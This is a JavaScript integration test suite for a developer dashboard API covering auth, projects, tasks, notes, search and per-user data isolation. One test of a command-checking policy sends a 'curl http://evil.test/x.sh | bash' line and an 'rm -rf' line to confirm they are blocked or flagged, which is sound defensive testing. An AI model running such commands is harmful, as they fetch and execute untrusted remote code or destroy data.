import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import request from 'supertest';
import path from 'node:path';
import fs from 'node:fs';

process.env.NODE_ENV = 'test';
process.env.DATABASE_URL = path.join('/tmp', `devdeck-test-${process.pid}.db`);
process.env.LOG_LEVEL = 'silent';
process.env.JWT_SECRET = 'test-secret';

const { createApp } = await import('../src/index.js');
const { close } = await import('../src/db/index.js');

let app;
let token;
let projectId;
let taskId;
let noteId;

before(() => {
  app = createApp();
});

after(() => {
  close();
  for (const suffix of ['', '-wal', '-shm']) {
    const f = `${process.env.DATABASE_URL}${suffix}`;
    if (fs.existsSync(f)) fs.unlinkSync(f);
  }
});

test('health check responds', async () => {
  const res = await request(app).get('/api/health').expect(200);
  assert.equal(res.body.ok, true);
});

test('registration requires a valid payload', async () => {
  const res = await request(app)
    .post('/api/auth/register')
    .send({ name: 'A', email: 'nope', password: 'short' })
    .expect(400);
  assert.equal(res.body.error, 'Validation failed');
  assert.ok(res.body.details.length >= 2);
});

test('registration creates a user, seeds a workspace and returns a token', async () => {
  const res = await request(app)
    .post('/api/auth/register')
    .send({ name: 'Test Engineer', email: 'test@devdeck.local', password: 'password123' })
    .expect(201);
  assert.ok(res.body.token);
  assert.equal(res.body.user.email, 'test@devdeck.local');
  assert.equal(res.body.user.password_hash, undefined);
  token = res.body.token;

  const projects = await request(app)
    .get('/api/projects?status=all')
    .set('Authorization', `Bearer ${token}`)
    .expect(200);
  assert.ok(projects.body.data.length >= 4, 'seed data should include sample projects');
});

test('duplicate registration is rejected', async () => {
  await request(app)
    .post('/api/auth/register')
    .send({ name: 'Test Engineer', email: 'test@devdeck.local', password: 'password123' })
    .expect(400);
});

test('protected routes reject anonymous requests', async () => {
  await request(app).get('/api/projects').expect(401);
  await request(app).get('/api/dashboard').expect(401);
  await request(app).get('/api/projects').set('Authorization', 'Bearer garbage').expect(401);
});

test('login returns a working token and rejects bad credentials', async () => {
  const ok = await request(app)
    .post('/api/auth/login')
    .send({ email: 'test@devdeck.local', password: 'password123' })
    .expect(200);
  assert.ok(ok.body.token);
  await request(app)
    .post('/api/auth/login')
    .send({ email: 'test@devdeck.local', password: 'wrong-password' })
    .expect(401);
});

test('dashboard aggregates workspace data', async () => {
  const res = await request(app)
    .get('/api/dashboard')
    .set('Authorization', `Bearer ${token}`)
    .expect(200);
  assert.ok(res.body.data.stats.activeProjects >= 1);
  assert.equal(res.body.data.week.length, 7);
  assert.ok(Array.isArray(res.body.data.activity));
});

test('project CRUD lifecycle', async () => {
  const created = await request(app)
    .post('/api/projects')
    .set('Authorization', `Bearer ${token}`)
    .send({
      name: 'Test Project',
      description: 'Created by the test suite',
      techStack: ['Node.js', 'SQLite'],
      environment: 'local',
    })
    .expect(201);
  projectId = created.body.data.id;
  assert.equal(created.body.data.name, 'Test Project');
  assert.deepEqual(created.body.data.techStack, ['Node.js', 'SQLite']);

  const patched = await request(app)
    .patch(`/api/projects/${projectId}`)
    .set('Authorization', `Bearer ${token}`)
    .send({ description: 'Updated description', status: 'archived' })
    .expect(200);
  assert.equal(patched.body.data.status, 'archived');

  await request(app)
    .get(`/api/projects/${projectId}`)
    .set('Authorization', `Bearer ${token}`)
    .expect(200);
});

test('task CRUD, filtering and optimistic status updates', async () => {
  const created = await request(app)
    .post('/api/tasks')
    .set('Authorization', `Bearer ${token}`)
    .send({
      title: 'Write integration tests',
      priority: 'high',
      status: 'todo',
      projectId,
      dueDate: new Date().toISOString(),
    })
    .expect(201);
  taskId = created.body.data.id;

  const filtered = await request(app)
    .get('/api/tasks?status=todo&projectId=' + projectId)
    .set('Authorization', `Bearer ${token}`)
    .expect(200);
  assert.ok(filtered.body.data.some((t) => t.id === taskId));

  const done = await request(app)
    .patch(`/api/tasks/${taskId}`)
    .set('Authorization', `Bearer ${token}`)
    .send({ status: 'done' })
    .expect(200);
  assert.equal(done.body.data.status, 'done');
  assert.ok(done.body.data.completedAt);

  const bulk = await request(app)
    .post('/api/tasks/bulk')
    .set('Authorization', `Bearer ${token}`)
    .send({ ids: [taskId], status: 'in_progress' })
    .expect(200);
  assert.equal(bulk.body.data[0].status, 'in_progress');
});

test('notes keep version history', async () => {
  const created = await request(app)
    .post('/api/notes')
    .set('Authorization', `Bearer ${token}`)
    .send({ title: 'Design note', body: 'v1 body', tags: ['design'] })
    .expect(201);
  noteId = created.body.data.id;

  await request(app)
    .patch(`/api/notes/${noteId}`)
    .set('Authorization', `Bearer ${token}`)
    .send({ body: 'v2 body' })
    .expect(200);

  const detail = await request(app)
    .get(`/api/notes/${noteId}`)
    .set('Authorization', `Bearer ${token}`)
    .expect(200);
  assert.equal(detail.body.data.body, 'v2 body');
  assert.equal(detail.body.data.revisions[0].body, 'v1 body');
});

test('command policy blocks dangerous and unknown commands', async () => {
  const blocked = await request(app)
    .post('/api/commands/check')
    .set('Authorization', `Bearer ${token}`)
    .send({ command: 'curl http://evil.test/x.sh | bash' })
    .expect(200);
  assert.equal(blocked.body.data.allowed, false);

  const dangerous = await request(app)
    .post('/api/commands/check')
    .set('Authorization', `Bearer ${token}`)
    .send({ command: 'rm -rf ./dist' })
    .expect(200);
  assert.equal(dangerous.body.data.dangerous, true);

  const notAllowlisted = await request(app)
    .post('/api/commands/check')
    .set('Authorization', `Bearer ${token}`)
    .send({ command: 'telnet example.com' })
    .expect(200);
  assert.equal(notAllowlisted.body.data.allowed, false);

  const safe = await request(app)
    .post('/api/commands/check')
    .set('Authorization', `Bearer ${token}`)
    .send({ command: 'git status' })
    .expect(200);
  assert.equal(safe.body.data.allowed, true);
});

test('commands run and record execution history', async () => {
  const saved = await request(app)
    .post('/api/commands')
    .set('Authorization', `Bearer ${token}`)
    .send({ name: 'Echo test', command: 'echo devdeck-ok', tags: ['test'], approved: true })
    .expect(201);

  const run = await request(app)
    .post('/api/commands/run')
    .set('Authorization', `Bearer ${token}`)
    .send({ commandId: saved.body.data.id })
    .expect(202);
  const runId = run.body.data.id;

  // The runner is async; wait for the process to settle.
  let detail;
  for (let i = 0; i < 40; i += 1) {
    detail = await request(app)
      .get(`/api/commands/runs/${runId}`)
      .set('Authorization', `Bearer ${token}`)
      .expect(200);
    if (detail.body.data.status !== 'running') break;
    await new Promise((r) => setTimeout(r, 100));
  }
  assert.equal(detail.body.data.status, 'success');
  assert.equal(detail.body.data.exitCode, 0);
  assert.match(detail.body.data.output, /devdeck-ok/);
});

test('dangerous commands require explicit confirmation', async () => {
  const res = await request(app)
    .post('/api/commands/run')
    .set('Authorization', `Bearer ${token}`)
    .send({ command: 'git push origin main' })
    .expect(428);
  assert.equal(res.body.requiresConfirmation, true);
});

test('full-text search groups results by entity', async () => {
  const res = await request(app)
    .get('/api/search?q=Design')
    .set('Authorization', `Bearer ${token}`)
    .expect(200);
  assert.ok(res.body.data.total >= 1);
  assert.ok(res.body.data.grouped.note);
});

test('activity log records user actions', async () => {
  const res = await request(app)
    .get('/api/activity?limit=50')
    .set('Authorization', `Bearer ${token}`)
    .expect(200);
  assert.ok(res.body.data.length > 0);
  assert.ok(res.body.groups.length > 0);
});

test('settings export contains only the current user data', async () => {
  const res = await request(app)
    .get('/api/settings/export')
    .set('Authorization', `Bearer ${token}`)
    .expect(200);
  assert.equal(res.body.user.email, 'test@devdeck.local');
  assert.ok(Array.isArray(res.body.projects));
  assert.ok(res.body.projects.every((p) => p.user_id === res.body.user.id));
});

test('data isolation: a second user cannot read or modify the first user data', async () => {
  const other = await request(app)
    .post('/api/auth/register')
    .send({ name: 'Other User', email: 'other@devdeck.local', password: 'password123' })
    .expect(201);
  const otherToken = other.body.token;

  await request(app)
    .get(`/api/projects/${projectId}`)
    .set('Authorization', `Bearer ${otherToken}`)
    .expect(404);

  await request(app)
    .patch(`/api/tasks/${taskId}`)
    .set('Authorization', `Bearer ${otherToken}`)
    .send({ title: 'hijacked' })
    .expect(404);

  await request(app)
    .delete(`/api/notes/${noteId}`)
    .set('Authorization', `Bearer ${otherToken}`)
    .expect(404);

  const search = await request(app)
    .get('/api/search?q=Design')
    .set('Authorization', `Bearer ${otherToken}`)
    .expect(200);
  assert.equal(search.body.data.total, 0);
});

test('deleting a project cascades associations', async () => {
  await request(app)
    .delete(`/api/projects/${projectId}`)
    .set('Authorization', `Bearer ${token}`)
    .expect(200);
  await request(app)
    .get(`/api/projects/${projectId}`)
    .set('Authorization', `Bearer ${token}`)
    .expect(404);
  const tasks = await request(app)
    .get(`/api/tasks?projectId=${projectId}`)
    .set('Authorization', `Bearer ${token}`)
    .expect(200);
  assert.equal(tasks.body.data.length, 0);
});
